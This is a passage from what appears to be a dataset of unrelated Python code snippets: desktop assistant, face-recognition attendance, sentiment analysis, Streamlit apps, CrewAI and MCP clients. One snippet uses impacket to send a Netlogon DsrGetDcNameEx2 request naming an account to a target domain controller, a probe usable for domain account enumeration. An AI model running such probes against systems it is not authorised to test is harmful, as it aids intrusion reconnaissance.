_get_kwargs(self):\n        return list(self.__dict__.items())\n\n    def _get_args(self):\n        return []\n\n\ndef _copy_items(items):\n    if items is None:\n        return []\n    # The copy module is used only in the 'append' and 'append_const'\n    # actions, and it is needed only when the default value isn't a list.\n    # Delay its import for speeding up the com",
    "import tkinter as tk\nimport random\nimport time\nimport pyautogui   # Para trabajar con coordenadas de pantalla globales\nimport requests   # Para obtener noticias desde una API\nimport math\nfrom PIL import Image, ImageTk \nimport io\nimport webbrowser\nfrom transformers import pipeline \nfrom googletrans import Translator # type: ignore\nimport sqlite3\nimport os\nimport pyodbc\nimport re\n\nclass Assistant:\n    def __init__(self, root):\n        self.root = root\n        self.root.title(\"Asistente Personal\")\n\n        # Hacer la ventana sin bordes y siempre visible\n        self.root.overrideredirect(1)  # Sin bordes\n        self.root.attributes('-topmost', True)  # Siempre encima\n        self.root.attributes('-transparentcolor', 'white')  # Color transparente\n\n        # Obtener dimensiones de la pantalla\n        self.screen_width = pyautogui.size().width\n        self.screen_height = pyautogui.size().height\n\n        # Configuraci\u00f3n del canvas con fondo transparente\n        self.canvas = tk.Canvas(self.root, width=100, height=170, bg=\"white\", highlightthickness=0)\n        self.canvas.pack()\n\n        # Dibujar personaje completo\n        self.draw_character()\n\n        # Variables de movimiento\n        self.angle = random.uniform(0, 2 * math.pi)  # \u00c1ngulo de direcci\u00f3n inicial\n        self.speed = 5  # Velocidad inicial\n        self.following = False\n        self.mouse_captured = False\n        self.hidden = False\n\n        # Evento para clic en el personaje\n        self.canvas.tag_bind(\"character\", \"<Button-1>\", self.show_menu)\n\n        # Movimiento inicial\n        self.move_character()\n\n        # Iniciar temporizador para persecuci\u00f3n\n        self.schedule_mouse_chase()\n\n        # Iniciar temporizador para mostrar memes\n        self.schedule_memes()\n\n        # Iniciar temporizador para mostrar jergas\n        self.schedule_jergas()\n\n        # Inicializar pipeline de PLN\n        self.chatbot = pipeline(\"text2text-generation\", model=\"facebook/blenderbot-400M-distill\")\n        self.translator = Translator()\n\n        # Cargar canciones desde el archivo TXT\n        self.songs = self.load_songs_from_txt()\n\n    def load_songs_from_txt(self):\n        \"\"\"Leer canciones desde el archivo TXT.\"\"\"\n        file_path = \"Base de Datos/BaseDeDatosCanciones.txt\"\n        songs = []\n\n        try:\n            with open(file_path, \"r\", encoding=\"utf-8\") as file:\n                for line in file:\n                    # Dividir los valores por espacios\n                    parts = line.strip().split(maxsplit=3)\n                    if len(parts) == 4:\n                        _, genero, nombre, interprete = parts\n                        songs.append((genero, nombre, interprete))\n\n            print(f\"{len(songs)} canciones cargadas desde el archivo TXT.\")\n        except Exception as e:\n            print(f\"Error al leer el archivo TXT: {e}\")\n\n        return songs\n\n    def show_recommendations_window(self):\n        \"\"\"Abrir una ventana independiente para recomendaciones de m\u00fasica.\"\"\"\n        recommendations_window = tk.Toplevel(self.root)\n        recommendations_window.title(\"Recomendaciones de M\u00fasica\")\n        recommendations_window.geometry(\"800x800\")\n        recommendations_window.configure(bg=\"#1E1E2F\")\n\n        # Estilo\n        title_font = (\"Helvetica\", 16, \"bold\")\n        text_font = (\"Helvetica\", 12)\n        fg_color = \"#FFFFFF\"\n        bg_color = \"#1E1E2F\"\n        button_color = \"#4CAF50\"\n        button_hover = \"#45A049\"\n\n        # T\u00edtulo\n        title_label = tk.Label(\n            recommendations_window, text=\"Recomendaciones de M\u00fasica\", font=title_font, bg=bg_color, fg=fg_color\n        )\n        title_label.pack(pady=10)\n\n        # \u00c1rea de texto para mostrar recomendaciones\n        text_area = tk.Text(\n            recommendations_window, wrap=tk.WORD, font=text_font, bg=\"#2E2E3F\", fg=fg_color, bd=0, relief=tk.FLAT\n        )\n        text_area.pack(padx=20, pady=10, fill=tk.BOTH, expand=True)\n\n        # Bot\u00f3n para obtener recomendaciones\n        recommend_button = tk.Button(\n            recommendations_window,\n            text=\"Mostrar Recomendaciones\",\n            font=text_font,\n            bg=button_color,\n            fg=fg_color,\n            activebackground=button_hover,\n            relief=tk.FLAT,\n            command=lambda: self.show_recommendations(text_area),\n        )\n        recommend_button.pack(pady=10)\n\n    def show_recommendations(self, text_area):\n        \"\"\"Mostrar 30 canciones aleatorias.\"\"\"\n        if not self.songs:\n            text_area.delete(1.0, tk.END)\n            text_area.insert(tk.END, \"No se encontraron canciones en el archivo TXT.\")\n            return\n\n        recommendations = random.sample(self.songs, min(30, len(self.songs)))\n\n        # Limpiar el \u00e1rea de texto y mostrar nuevas recomendaciones\n        text_area.delete(1.0, tk.END)\n        text_area.insert(tk.END, \"Recomendaciones de Canciones:\\n\\n\")\n\n        for i, (genero, nombre, interprete) in enumerate(recommendations, start=1):\n            text_area.insert(\n      ",
    "import cv2\r\nimport numpy as np\r\nfrom tensorflow.keras.models import load_model\r\nimport json\r\n\r\nmodel_path = 'face_recognition_model.h5'\r\nclass_labels_path = 'class_labels.json'\r\n\r\nmodel = load_model(model_path)\r\n\r\nwith open(class_labels_path, 'r') as json_file:\r\n    class_labels = json.load(json_file)\r\n\r\nclass_labels = {v: k for k, v in class_labels.items()}\r\n\r\nface_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')\r\n\r\ncap = cv2.VideoCapture(0)\r\n\r\nif not cap.isOpened():\r\n    print(\"Error: Unable to access the camera.\")\r\n    exit()\r\n\r\nprint(\"Press 'Enter' to capture a photo or 'q' to quit.\")\r\n\r\nwhile True:\r\n    ret, frame = cap.read()\r\n    if not ret:\r\n        print(\"Failed to capture frame. Exiting...\")\r\n        break\r\n\r\n    cv2.imshow(\"Face Recognition\", frame)\r\n\r\n    key = cv2.waitKey(1)\r\n\r\n    if key == ord('q'):\r\n        print(\"Exiting...\")\r\n        break\r\n    elif key == ord('\\r'):\r\n        print(\"Photo captured!\")\r\n\r\n        gray_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\r\n\r\n        faces = face_cascade.detectMultiScale(gray_frame, scaleFactor=1.1, minNeighbors=5, minSize=(30, 30))\r\n\r\n        if len(faces) == 0:\r\n            print(\"No face detected. Marking as Absent.\")\r\n            continue\r\n\r\n        x, y, w, h = faces[0]\r\n        face = frame[y:y + h, x:x + w]\r\n\r\n        resized_face = cv2.resize(face, (224, 224))\r\n        normalized_face = resized_face / 255.0\r\n        img_array = np.expand_dims(normalized_face, axis=0)\r\n\r\n        predictions = model.predict(img_array)\r\n        predicted_class = np.argmax(predictions[0])\r\n        confidence = predictions[0][predicted_class]\r\n\r\n        print(f\"Confidence for detected face: {confidence:.2f}\")\r\n\r\n        if confidence >= 0.85:\r\n            label = class_labels[predicted_class]\r\n            if label == 'person_1':\r\n                print(f\"Person Detected: {label} (Confidence: {confidence:.2f}) - Present\")\r\n            elif label == 'person_2':\r\n                print(f\"Person Detected: {label} (Confidence: {confidence:.2f}) - Present\")\r\n            else:\r\n                print(f\"Detected: {label} - Absent (Confidence: {confidence:.2f})\")\r\n        else:\r\n            print(\"Unknown Person Detected. Marking as Absent.\")\r\n\r\ncap.release()\r\ncv2.destroyAllWindows()\r\n",
    "from logger import logger\nfrom impacket.dcerpc.v5 import nrpc\nfrom impacket.dcerpc.v5.rpcrt import DCERPCException\nfrom impacket.dcerpc.v5.transport import DCERPCTransportFactory\n\nNULL = '\\x00'\n\ndef DsrGetDcNameEx2(target_ip: str, port: int, account: str, site_name: str, domain_name: str):\n    # Build the RPC transport using ncacn_ip_tcp over <target_ip>:<port>\n    rpctransport = DCERPCTransportFactory(f'ncacn_ip_tcp:{target_ip}[{port}]')\n    dce = rpctransport.get_dce_rpc()\n    dce.connect()\n    logger.info(f\"Connected to {target_ip}:{port}\")\n    \n    try:\n        dce.bind(nrpc.MSRPC_UUID_NRPC)\n    except DCERPCException:\n        logger.error(\"Failed to bind to NRPC interface!\")\n        logger.info(\"This might be because the target is doesn't have netlogon service running.\")\n        raise\n\n    request = nrpc.DsrGetDcNameEx2()\n    request['ComputerName']                = NULL\n    request['AccountName']                 = account + NULL\n    request['AllowableAccountControlBits'] = 1 << 9\n    request['DomainName']                  = domain_name + NULL\n    request['DomainGuid']                  = NULL\n    request['SiteName']                    = site_name + NULL\n    request['Flags']                       = 0\n\n    logger.info(\"Sending DsrGetDcNameEx2 request...\")\n    resp = dce.request(request)\n    resp.dump()\n    dce.disconnect()\n",
    "import re\nimport sqlite3\nfrom telethon import TelegramClient\nfrom telethon.errors import SessionPasswordNeededError\nfrom telethon.tl.functions.messages import GetHistoryRequest\nimport asyncio\nimport os\n\nimport pandas as pd\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.linear_model import LogisticRegression\nfrom sklearn.metrics import accuracy_score, classification_report\n\nimport torch\nimport torch.nn as nn\nimport torch.optim as optim\nfrom torch.utils.data import TensorDataset, DataLoader\n\nimport joblib\nfrom arxiv_util import *\n\n# Define the model\nclass PreferenceModel(nn.Module):\n    def __init__(self, input_dim, num_classes):\n        super().__init__()\n        hidden_dim = 512\n        self.linear = nn.Linear(input_dim, hidden_dim)\n        self.relu = nn.ReLU()\n        self.linear2 = nn.Linear(hidden_dim, hidden_dim)\n        self.relu = nn.ReLU()\n        self.linear3 = nn.Linear(hidden_dim, num_classes)\n        \n    def forward(self, x):\n        x = self.relu(self.linear(x))\n        x = self.linear2(x)\n        x = self.relu(x)\n        x = self.linear3(x)\n        return x\n\ndef train_model(data):\n    df = pd.DataFrame(data, columns=['text', 'preference'])\n\n    # Display the first few rows\n    print(\"Dataset Preview:\")\n    print(df.head(), \"\\n\")\n\n    # Features and Labels\n    X = df['text']\n    y = df['preference']\n\n    # Split the data: 80% training, 20% testing\n    X_train, X_test, y_train, y_test = train_test_split(\n        X, y, test_size=0.2, random_state=42\n    )\n\n    '''\n    # Data augmentation\n    for d in data:\n        aug_data.append({ \"text\": d[\"text\"], \"preference\": min(d[\"preference\"] + 1, 5)})\n        aug_data.append({ \"text\": d[\"text\"], \"preference\": d[\"preference\"]})\n        aug_data.append({ \"text\": d[\"text\"], \"preference\": max(d[\"preference\"] - 1, 0)})\n    '''\n\n    print(f\"Training samples: {X_train.shape[0]}\")\n    print(f\"Testing samples: {X_test.shape[0]}\\n\")\n\n    # Initialize the TF-IDF Vectorizer\n    vectorizer = TfidfVectorizer()\n\n    # Fit the vectorizer on the training data and transform\n    X_train_tfidf = vectorizer.fit_transform(X_train)\n\n    # Transform the testing data\n    X_test_tfidf = vectorizer.transform(X_test)\n\n    # Initialize the PyTorch model\n    # Convert sparse matrices to tensors\n    X_train_tensor = torch.FloatTensor(X_train_tfidf.toarray())\n    X_test_tensor = torch.FloatTensor(X_test_tfidf.toarray())\n    y_train_tensor = torch.LongTensor(y_train.values)\n    y_test_tensor = torch.LongTensor(y_test.values)\n\n    # Create data loaders\n    train_dataset = TensorDataset(X_train_tensor, y_train_tensor)\n    train_loader = DataLoader(train_dataset, batch_size=32, shuffle=True)\n\n    # We use the class weights to balance the samples\n    class_weights = torch.tensor([(y_train == i).sum().item() for i in range(len(set(y_train)))])\n    class_weights = 1.0 / class_weights\n    class_weights = class_weights / class_weights.sum()  # Re-normalize\n\n    model = PreferenceModel(X_train_tfidf.shape[1], len(set(y_train)))\n    \n    def create_smooth_target(y, num_classes=6):\n        # Create a zero tensor of shape [batch_size, num_classes]\n        batch_size = y.shape[0]\n        targets = torch.zeros(batch_size, num_classes)\n        \n        # Get all labels as tensor\n        labels = y.long()\n        \n        # Set main probability mass (0.6) for current labels\n        targets.scatter_(1, labels.unsqueeze(1), 0.6)\n        \n        # Set 0.2 probability mass for labels-1 where valid\n        valid_prev = (labels > 0).nonzero().squeeze()\n        if valid_prev.numel() > 0:\n            targets[valid_prev, labels[valid_prev]-1] = 0.2\n        \n        # Set 0.2 probability mass for labels+1 where valid\n        valid_next = (labels < (num_classes-1)).nonzero().squeeze()\n        if valid_next.numel() > 0:\n            targets[valid_next, labels[valid_next]+1] = 0.2\n        \n        # Normalize each row\n        targets = targets / targets.sum(dim=1, keepdim=True)\n                \n        return targets\n\n    def weighted_kl_loss(pred, target, class_weights):\n        # pred shape: [batch_size, num_classes]\n        # target shape: [batch_size]\n        smooth_targets = create_smooth_target(target)  # [batch_size, num_classes]\n        kl_loss = nn.KLDivLoss(reduction='none')(pred.log_softmax(dim=1), smooth_targets)\n        # Sum across class dimension\n        kl_loss = kl_loss.sum(dim=1)  # [batch_size]\n        # Apply class weights\n        weight_per_sample = class_weights[target]  # [batch_size]\n        weighted_loss = (kl_loss * weight_per_sample).mean()\n        return weighted_loss\n\n    criterion = lambda pred, target: weighted_kl_loss(pred, target, class_weights)\n    optimizer = optim.Adam(model.parameters(), weight_decay=5e-5)\n\n    # Train the model balancing the samples for each class\n    num_epochs = 50\n    for epoch in range(num_epochs):\n        model.train()\n        for inputs, labels in train_loader:\n            opt",
    "# pip install pandas nltk pyodbc sqlalchemy\r\n\r\nimport pandas as pd\r\nimport pyodbc\r\nimport nltk\r\nfrom nltk.sentiment.vader import SentimentIntensityAnalyzer\r\n\r\n\r\n# Download the VADER lexicon for sentiment analysis if not already present.\r\nnltk.download('vader_lexicon')\r\n\r\n# Define a function to fetch data from a SQL database using a SQL query\r\ndef fetch_data_from_sql():\r\n    # Define the connection string with parameters for the database connection\r\n    conn_str = (\r\n        \"Driver={SQL Server};\"  # Specify the driver for SQL Server\r\n        \"Server=DESKTOP-WEALTH\\\\SQLEXPRESS;\"  # Specify your SQL Server instance\r\n        \"Database=MarketingAnalytics;\"  # Specify the database name\r\n        \"Trusted_Connection=yes;\"  # Use Windows Authentication for the connection\r\n    )\r\n    # Establish the connection to the database\r\n    conn = pyodbc.connect(conn_str)\r\n    \r\n    # Define the SQL query to fetch customer reviews data\r\n    query = \"SELECT ReviewID, CustomerID, ProductID, ReviewDate, Rating, ReviewText FROM customer_reviews\"\r\n    \r\n    # Execute the query and fetch the data into a DataFrame\r\n    df = pd.read_sql(query, conn)\r\n    \r\n    # Close the connection to free up resources\r\n    conn.close()\r\n    \r\n    # Return the fetched data as a DataFrame\r\n    return df\r\n\r\n# Fetch the customer reviews data from the SQL database\r\ncustomer_reviews_df = fetch_data_from_sql()\r\n\r\n# Initialize the VADER sentiment intensity analyzer for analyzing the sentiment of text data\r\nsia = SentimentIntensityAnalyzer()\r\n\r\n# Define a function to calculate sentiment scores using VADER\r\ndef calculate_sentiment(review):\r\n    # Get the sentiment scores for the review text\r\n    sentiment = sia.polarity_scores(review)\r\n    # Return the compound score, which is a normalized score between -1 (most negative) and 1 (most positive)\r\n    return sentiment['compound']\r\n\r\n# Define a function to categorize sentiment using both the sentiment score and the review rating\r\ndef categorize_sentiment(score, rating):\r\n    # Use both the text sentiment score and the numerical rating to determine sentiment category\r\n    if score > 0.05:  # Positive sentiment score\r\n        if rating >= 4:\r\n            return 'Positive'  # High rating and positive sentiment\r\n        elif rating == 3:\r\n            return 'Mixed Positive'  # Neutral rating but positive sentiment\r\n        else:\r\n            return 'Mixed Negative'  # Low rating but positive sentiment\r\n    elif score < -0.05:  # Negative sentiment score\r\n        if rating <= 2:\r\n            return 'Negative'  # Low rating and negative sentiment\r\n        elif rating == 3:\r\n            return 'Mixed Negative'  # Neutral rating but negative sentiment\r\n        else:\r\n            return 'Mixed Positive'  # High rating but negative sentiment\r\n    else:  # Neutral sentiment score\r\n        if rating >= 4:\r\n            return 'Positive'  # High rating with neutral sentiment\r\n        elif rating <= 2:\r\n            return 'Negative'  # Low rating with neutral sentiment\r\n        else:\r\n            return 'Neutral'  # Neutral rating and neutral sentiment\r\n\r\n# Define a function to bucket sentiment scores into text ranges\r\ndef sentiment_bucket(score):\r\n    if score >= 0.5:\r\n        return '0.5 to 1.0'  # Strongly positive sentiment\r\n    elif 0.0 <= score < 0.5:\r\n        return '0.0 to 0.49'  # Mildly positive sentiment\r\n    elif -0.5 <= score < 0.0:\r\n        return '-0.49 to 0.0'  # Mildly negative sentiment\r\n    else:\r\n        return '-1.0 to -0.5'  # Strongly negative sentiment\r\n\r\n# Apply sentiment analysis to calculate sentiment scores for each review\r\ncustomer_reviews_df['SentimentScore'] = customer_reviews_df['ReviewText'].apply(calculate_sentiment)\r\n\r\n# Apply sentiment categorization using both text and rating\r\ncustomer_reviews_df['SentimentCategory'] = customer_reviews_df.apply(\r\n    lambda row: categorize_sentiment(row['SentimentScore'], row['Rating']), axis=1)\r\n\r\n# Apply sentiment bucketing to categorize scores into defined ranges\r\ncustomer_reviews_df['SentimentBucket'] = customer_reviews_df['SentimentScore'].apply(sentiment_bucket)\r\n\r\n# Display the first few rows of the DataFrame with sentiment scores, categories, and buckets\r\nprint(customer_reviews_df.head())\r\n\r\n# Save the DataFrame with sentiment scores, categories, and buckets to a new CSV file\r\ncustomer_reviews_df.to_csv('fact_customer_reviews_with_sentiment.csv', index=False)\r\n",
    "import streamlit as st\nimport plotly.express as px\nimport plotly.graph_objects as go\nimport pandas as pd\nfrom database import BillDatabase\nfrom datetime import datetime\nfrom bill_types import BillCategory\nfrom loguru import logger\nimport os\nimport socket\nfrom user_manager import UserManager\n\n# \u83b7\u53d6\u672c\u673aIP\u5730\u5740\u7684\u51fd\u6570\ndef get_client_ip():\n    try:\n        # \u5c1d\u8bd5\u83b7\u53d6Streamlit\u63d0\u4f9b\u7684\u8fdc\u7a0bIP\n        remote_ip = st.runtime.scriptrunner.add_script_run_ctx().get_remote_ip()\n        if remote_ip:\n            return remote_ip\n        \n        # \u5907\u9009\u65b9\u6848\uff1a\u83b7\u53d6\u672c\u673aIP\n        return socket.gethostbyname(socket.gethostname())\n    except Exception as e:\n        logger.warning(f\"\u83b7\u53d6IP\u5730\u5740\u5931\u8d25: {e}\")\n        return \"Unknown\"\n\n# \u914d\u7f6e\u65e5\u5fd7\nlog_dir = os.path.join(os.path.dirname(__file__), 'logs')\nos.makedirs(log_dir, exist_ok=True)\nlogger.add(os.path.join(log_dir, 'bill_app_{time:YYYY-MM-DD}.log'), \n           rotation='1 day',  # \u6309\u5929\u5207\u5272\n           retention='7 days',  # \u4fdd\u7559\u6700\u8fd17\u5929\u7684\u65e5\u5fd7\n           level='INFO',  # \u65e5\u5fd7\u7ea7\u522b\n           format=\"{time} | {level} | IP: {extra[ip]} | {message}\"  # \u81ea\u5b9a\u4e49\u65e5\u5fd7\u683c\u5f0f\n)\n\nclass BillTrackerApp:\n    def __init__(self):\n        \"\"\"\u521d\u59cb\u5316\u5e94\u7528\"\"\"\n        try:\n            self.db = BillDatabase(port=27017)\n            self.user_manager = UserManager()\n            st.set_page_config(page_title='\u91d1\u8d26\u672c', page_icon='\ud83d\udcb0')\n            \n            # \u81ea\u5b9a\u4e49\u4fa7\u8fb9\u680f\u6837\u5f0f\n            st.markdown(\"\"\"\n            <style>\n            .sidebar .sidebar-content {\n                background-color: #f4f6f9;  /* \u66f4\u67d4\u548c\u7684\u80cc\u666f\u8272 */\n                border-radius: 15px;  /* \u66f4\u5706\u7684\u5706\u89d2 */\n                padding: 20px;\n                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);  /* \u66f4\u8f7b\u7684\u9634\u5f71 */\n            }\n            .sidebar .stRadio > label {\n                font-weight: 700;  /* \u66f4\u7c97\u7684\u5b57\u4f53 */\n                color: #2c3e50;  /* \u66f4\u6df1\u7684\u6587\u5b57\u989c\u8272 */\n                font-size: 16px;  /* \u7a0d\u5927\u7684\u5b57\u4f53 */\n            }\n            .sidebar .stRadio > div > div > label {\n                color: #34495e;  /* \u9009\u9879\u6587\u5b57\u989c\u8272 */\n                font-weight: 500;\n            }\n            .sidebar .stRadio > div > div {\n                background-color: #ffffff;  /* \u7eaf\u767d\u80cc\u666f */\n                border-radius: 8px;  /* \u5706\u89d2 */\n                padding: 10px;\n                border: 1px solid #ecf0f1;  /* \u8f7b\u5fae\u8fb9\u6846 */\n            }\n            </style>\n            \"\"\", unsafe_allow_html=True)\n            \n            # \u521d\u59cb\u5316\u4f1a\u8bdd\u72b6\u6001\n            if 'logged_in' not in st.session_state:\n                st.session_state.logged_in = False\n                st.session_state.username = None\n            \n            logger.info(\"\u5e94\u7528\u521d\u59cb\u5316\u6210\u529f\")\n        except Exception as e:\n            logger.error(f\"\u5e94\u7528\u521d\u59cb\u5316\u5931\u8d25: {e}\")\n            st.error(f\"\u5e94\u7528\u521d\u59cb\u5316\u5931\u8d25: {e}\")\n    \n    def login_page(self):\n        \"\"\"\u767b\u5f55\u9875\u9762\"\"\"\n        st.title('\ud83d\udcb0 \u91d1\u8d26\u672c - \u767b\u5f55')\n        \n        username = st.text_input('\u7528\u6237\u540d')\n        password = st.text_input('\u5bc6\u7801', type='password')\n        \n        col1, col2 = st.columns(2)\n        \n        with col1:\n            if st.button('\u767b\u5f55'):\n                if self.user_manager.authenticate(username, password):\n                    st.session_state.logged_in = True\n                    st.session_state.username = username\n                    st.success('\u767b\u5f55\u6210\u529f\uff01')\n                    logger.info(f\"\u7528\u6237 {username} \u767b\u5f55\u6210\u529f\", extra={\"ip\": get_client_ip()})\n                    st.rerun()\n                else:\n                    st.error('\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef')\n                    logger.warning(f\"\u767b\u5f55\u5931\u8d25\uff1a{username}\")\n        \n        # \u6ce8\u518c\u6309\u94ae\u6682\u65f6\u9690\u85cf\n        # with col2:\n        #     if st.button('\u6ce8\u518c'):\n        #         new_username = st.text_input('\u65b0\u7528\u6237\u540d')\n        #         new_password = st.text_input('\u65b0\u5bc6\u7801', type='password')\n        #         confirm_password = st.text_input('\u786e\u8ba4\u5bc6\u7801', type='password')\n                \n        #         if new_password == confirm_password:\n        #             if self.user_manager.add_user(new_username, new_password):\n        #                 st.success('\u6ce8\u518c\u6210\u529f\uff01')\n        #                 logger.info(f\"\u7528\u6237 {new_username} \u6ce8\u518c\u6210\u529f\", extra={\"ip\": get_client_ip()})\n        #             else:\n        #                 st.error('\u7528\u6237\u540d\u5df2\u5b58\u5728')\n        #         else:\n        #             st.error('\u4e24\u6b21\u5bc6\u7801\u4e0d\u4e00\u81f4')\n    \n    def run(self):\n        \"\"\"\u8fd0\u884cStreamlit\u5e94\u7528\"\"\"\n        # \u68c0\u67e5\u767b\u5f55\u72b6\u6001\n        if not st.session_state.logged_in:\n            self.login_page()\n            return\n        \n        st.sidebar.header('\ud83d\udcb0 \u91d1\u8d26\u672c')\n        \n        # \u9875\u9762\u5bfc\u822a\n        menu = st.sidebar.radio(\n            '\u9009\u62e9\u529f\u80fd', \n            [\n                '\u8d26\u5355\u5f55\u5165', \n                '\u8d22\u52a1\u770b\u677f', \n                '\u8d26\u5355\u7edf\u8ba1', \n                '\u8d26\u5355\u67e5\u8be2', \n                '\u5e74\u5ea6\u603b\u89c8'\n            ]\n        )\n        \n        st.title('\ud83d\udcb0 \u91d1\u8d26\u672c')\n        \n        if menu == '\u8d26\u5355\u5f55\u5165':\n            self.record_bill_page()\n        elif menu == '\u8d22\u52a1\u770b\u677f':\n            self.dashboard_page()\n        elif menu == '\u8d26\u5355\u7edf\u8ba1':\n            self.bill_statistics_page()\n        elif menu == '\u8d26\u5355\u67e5\u8be2':\n            self.query_bills_page()\n        elif menu == '\u5e74\u5ea6\u603b\u89c8':\n            self.annual_overview_page()\n        \n        st.sidebar.text(f'\u6b22\u8fce\uff0c{st.session_state.username}')\n        if st.sidebar.b",
    "import subprocess\nfrom crewai.tools import BaseTool\nfrom typing import Type\nfrom pydantic import BaseModel, Field\nfrom langchain_community.tools.yahoo_finance_news import YahooFinanceNewsTool\n\nclass WebRequestToolInput(BaseModel):\n    \"\"\"Input schema for MyCustomTool.\"\"\"\n    argument: str = Field(..., description=\"Website address\")\n\nclass WebRequestTool(BaseTool):\n    name: str = \"Web Request Tool\"\n    description: str = (\n        \"This is a tool for sending a web request to a website. It return the content of the website.\"\n    )\n    args_schema: Type[BaseModel] = WebRequestToolInput\n\n    def _run(self, argument: str) -> str:\n        import requests\n        response = requests.get(argument)\n        return response.text\n    \nclass WriteToFileInput(BaseModel):\n    \"\"\"Input schema for MyCustomTool.\"\"\"\n    file_name: str = Field(..., description=\"File name\")\n    content: str = Field(..., description=\"Content to write to file\")\n\nclass WriteToFileTool(BaseTool):\n    name: str = \"Write to File Tool\"\n    description: str = (\n        \"This is a tool for writing given content to file.\"\n    )\n    args_schema: Type[BaseModel] = WriteToFileInput\n\n    def _run(self, file_name: str, content: str) -> str:\n        with open(file_name, \"w\") as f:\n            out = f.write(bytearray(content))\n            if out == 0:\n                raise Exception(\"Error writing to file\")\n        return \"Content written to file successfully\"\n\nclass YFinanceToolInput(BaseModel):\n    \"\"\"Input for the YahooFinanceNews tool.\"\"\"\n    query: str = Field(description=\"company ticker query to look up\")\n\ntool = YahooFinanceNewsTool()\n\nclass YFinanceWrapperTool(BaseTool):\n    \"\"\"Tool that searches financial news on Yahoo Finance.\"\"\"\n\n    name: str = \"yahoo_finance_news\"\n    description: str = (\n        \"Useful for when you need to find financial news \"\n        \"about a public company. \"\n        \"Input should be a company ticker. \"\n        \"For example, AAPL for Apple, MSFT for Microsoft.\"\n    )\n    args_schema: Type[BaseModel] = YFinanceToolInput\n\n    def _run(self, query: str) -> str:\n        print(subprocess.check_output([\"pip\", \"install\", \"yfinance\"]))\n        return tool._run(query=query)\n",
    "from models.bybit_account import BybitAccount\nfrom .ui_actions import UiActions\n\nclass SetUpActions(UiActions):\n    def __init__(self, main_window_obj):\n        super().__init__(main_window_obj)\n        self.function_name = 'full_set_up'\n        self.timer_name = 'set_up_timeEdit'\n\n\n    def get_checkbox_list(self):\n        checkbox_list = []\n\n        from main import MainWindow\n        self.main_window_obj: MainWindow\n\n        if self.main_window_obj.ui.fa2_checkbox.isChecked():\n            checkbox_list.append('add_2fa')\n        if self.main_window_obj.ui.wl_on_checkbox.isChecked():\n            checkbox_list.append('enable_whitelist_withdraw')\n        if self.main_window_obj.ui.add_wallet_checkbox.isChecked():\n            checkbox_list.append('generate_address_add_to_whitelist')\n        if self.main_window_obj.ui.only_wl_checkbox.isChecked():\n            checkbox_list.append('withdraw_via_whitelist_only')\n        if self.main_window_obj.ui.block_checkbox.isChecked():\n            checkbox_list.append('block_new_withdraw_address')\n        if self.main_window_obj.ui.change_password_checkbox.isChecked():\n            checkbox_list.append('change_password')\n\n        return checkbox_list\n\n    def result_btn(self):\n        self.func_args = [self.get_checkbox_list()]\n        print(self.func_args)\n        super().result_btn()\n\n",
    "import os\nimport re\nimport json\nimport time\nimport html\nimport logging\nimport requests\nimport streamlit as st\n\nlogging.basicConfig(level=logging.INFO)\nmcp_base_url = os.environ.get('MCP_BASE_URL')\nmcp_command_list = [\"uvx\", \"npx\", \"node\", \"python\",\"docker\"]\n\ndef request_list_models():\n    url = mcp_base_url.rstrip('/') + '/v1/list/models'\n    models = []\n    try:\n        response = requests.get(url)\n        data = response.json()\n        models = data.get('models', [])\n    except Exception as e:\n        logging.error('request list models error: %s' % e)\n    return models\n\ndef request_list_mcp_servers():\n    url = mcp_base_url.rstrip('/') + '/v1/list/mcp_server'\n    mcp_servers = []\n    try:\n        response = requests.get(url)\n        data = response.json()\n        mcp_servers = data.get('servers', [])\n    except Exception as e:\n        logging.error('request list mcp servers error: %s' % e)\n    return mcp_servers\n\ndef request_add_mcp_server( server_id, server_name, command, args=[], env={},config_json={}):\n    url = mcp_base_url.rstrip('/') + '/v1/add/mcp_server'\n    status = False\n    try:\n        payload = {\n            \"server_id\": server_id,\n            \"server_desc\": server_name,\n            \"command\": command,\n            \"args\": args,\n            \"env\": env,\n            \"config_json\":config_json\n        }\n        response = requests.post(url, json=payload)\n        data = response.json()\n        status = data['errno'] == 0\n        msg = data['msg']\n    except Exception as e:\n        msg = \"Add MCP server occurred errors!\"\n        logging.error('request add mcp servers error: %s' % e)\n    return status, msg\n\ndef request_chat(messages, model_id, mcp_server_ids, max_tokens=1024):\n    url = mcp_base_url.rstrip('/') + '/v1/chat/completions'\n    msg, msg_extras = 'something is wrong!', {}\n    try:\n        payload = {\n            'messages': messages,\n            'model': model_id,\n            'mcp_server_ids': mcp_server_ids,\n            'max_tokens': max_tokens,\n        }\n        logging.info('request payload: %s' % payload)\n        response = requests.post(url, json=payload)\n        data = response.json()\n        msg = data['choices'][0]['message']['content']\n        msg_extras = data['choices'][0]['message_extras']\n    except Exception as e:\n        msg = 'An error occurred when calling the Converse operation: The system encountered an unexpected error during processing. Try your request again.'\n        logging.error('request chat error: %s' % e)\n    logging.info('response msg: %s' % msg)\n    return msg, msg_extras\n\n# st session state\nif not 'model_names' in st.session_state:\n    st.session_state.model_names = {}\nfor x in request_list_models():\n    st.session_state.model_names[x['model_name']] = x['model_id']\n\nif not 'mcp_servers' in st.session_state:\n    st.session_state.mcp_servers = {}\nfor x in request_list_mcp_servers():\n    st.session_state.mcp_servers[x['server_name']] = x['server_id']\n\nif \"messages\" not in st.session_state:\n    st.session_state.messages = [{\"role\": \"assistant\", \"content\": \"How can I help you?\"}]\n\n\n# add new mcp UI and handle\ndef add_new_mcp_server_handle():\n    status, msg = True, \"The server already been added!\"\n    server_name = st.session_state.new_mcp_server_name\n    server_id = st.session_state.new_mcp_server_id\n    server_cmd = st.session_state.new_mcp_server_cmd\n    server_args = st.session_state.new_mcp_server_args\n    server_env = st.session_state.new_mcp_server_env\n    server_config_json = st.session_state.new_mcp_server_json_config\n    config_json = {}\n    if not server_name:\n        status, msg = False, \"The server name is empty!\"\n    elif server_name in st.session_state.mcp_servers:\n        status, msg = False, \"The server name exists, try another name!\"\n\n    # \u5982\u679cserver_config_json\u914d\u7f6e\uff0c\u5219\u5df2server_config_json\u4e3a\u51c6\n    if server_config_json:\n        try:\n            config_json = json.loads(server_config_json)\n            if not all([isinstance(k, str) for k in config_json.keys()]):\n                raise ValueError(\"env key must be str.\")\n            if 